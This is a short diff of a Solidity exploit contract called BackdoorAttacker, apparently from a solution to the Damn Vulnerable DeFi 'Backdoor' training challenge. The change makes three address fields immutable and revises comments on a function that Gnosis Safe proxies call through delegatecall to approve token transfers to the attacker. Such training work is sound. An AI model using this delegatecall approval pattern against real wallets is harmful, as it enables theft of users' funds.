@@ -7,9 +7,10 @@ import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 
 contract BackdoorAttacker {
-    address private masterCopy;
-    address private walletFactory;
-    address private registryAddress;
+    /// @dev are immutable so the values are embedded into the bytecode when deployed as to avoid variable collision when delegatecall is used in the exploit
+    address private immutable masterCopy;
+    address private immutable walletFactory;
+    address private immutable registryAddress;
     address private immutable tokenAddress;
 
     constructor(address _masterCopy, address _walletFactory, address _registryAddress, address _tokenAddress){
@@ -20,7 +21,7 @@ contract BackdoorAttacker {
     }
 
     function delegateApprove(address attackerContract) external {
-        /// @notice: this will be called by the Gnosis Safe wallet proxy
+        /// @dev: called by the Gnosis Safe wallet proxy using delegatecall
         DamnValuableToken(tokenAddress).approve(attackerContract, 10 ether);
     }
 
